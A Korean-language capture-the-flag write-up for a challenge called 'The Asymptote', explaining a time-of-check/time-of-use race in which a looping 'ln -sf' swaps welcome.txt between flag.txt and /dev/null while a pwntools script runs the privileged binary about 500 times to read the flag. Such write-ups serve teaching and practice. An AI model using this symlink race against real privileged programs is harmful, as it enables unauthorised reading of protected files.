# 문제명
The Asymptote

## 문제 설명

서버에서 실행되는 바이너리가 특정 파일을 검증하는 과정에서 발생하는 취약점을 이용하는 문제입니다. `welcome.txt` 파일에 대한 심볼릭 링크를 조작하여 권한을 우회하고 플래그를 획득해야 합니다.


## 풀이
-해당 문제는 심볼릭 링크의 대상을 빠르게 교체하는 **Race Condition(레이스 컨디션)** 공격을 필요로 합니다. `ln -sf` 명령어를 무한 루프로 실행하여 `welcome.txt`가 `flag.txt`를 가리켰다가, 다시 `/dev/null`을 가리키도록 반복합니다. - 이 루프가 돌아가는 동안 `./challenge` 바이너리를 여러 번 실행하면, 검증 로직을 통과하는 동시에 플래그 파일을 읽는 타이밍을 잡을 수 있습니다

### 분석

-해당 문제는 서버 내에 존재하는 challenge 바이너리를 실행하여 권한이 제한된 flag.txt의 내용을 읽어내는 것을 목표로 하며, 사용자는 쉘 접속 권한을 통해 서버 내부 환경에서 명령어를 실행할 수 있습니다. 바이너리 실행 시 특정 파일인 welcome.txt를 검증하거나 참조하는 로직이 포함되어 있는데, 이 과정에서 파일의 무결성을 확인하는 시점과 실제 사용 시점 사이의 간극을 공략해야 합니다.

### 취약점
-이 문제의 핵심 취약점은 파일 검증과 실행 로직 사이의 미세한 시간차를 이용하는 레이스 컨디션(Race Condition)입니다. ln -sf 명령어를 사용하여 welcome.txt가 가리키는 실제 대상을 순식간에 교체하는 심볼릭 링크 조작이 가능하며, 이를 통해 정상적인 파일로 검증을 통과시킨 직후 실제 로직이 작동하기 전 플래그 파일로 바꿔치기할 수 있습니다.

### 익스플로잇

-익스플로잇을 위해 먼저 while 루프를 사용하여 welcome.txt가 flag.txt와 /dev/null을 번갈아가며 가리키도록 하는 백그라운드 프로세스를 실행합니다. 그 후 파이썬의 pwn 라이브러리를 활용해 challenge 바이너리를 약 500회 이상 반복 실행함으로써, 심볼릭 링크가 플래그를 가리키는 정확한 타이밍에 로직이 맞물리도록 유도하여 최종적으로 플래그를 획득합니다.

풀이 과정을 단계별로 작성합니다.

```python
```python
from pwn import *

r = remote('34.131.216.230', 1338)
r.recvuntil(b'$')

# 심볼릭 링크 교체 무한 루프 실행
r.sendline(b'while true :; do ln -sf flag.txt welcome.txt; ln -sf /dev/null welcome.txt; done &')
r.recvuntil(b'$')

# 타이밍 공략을 위한 반복 실행
for i in range(500):
    r.sendline(b'./challenge')

output = r.recvall(timeout=5).decode()
print(output)
'''
```
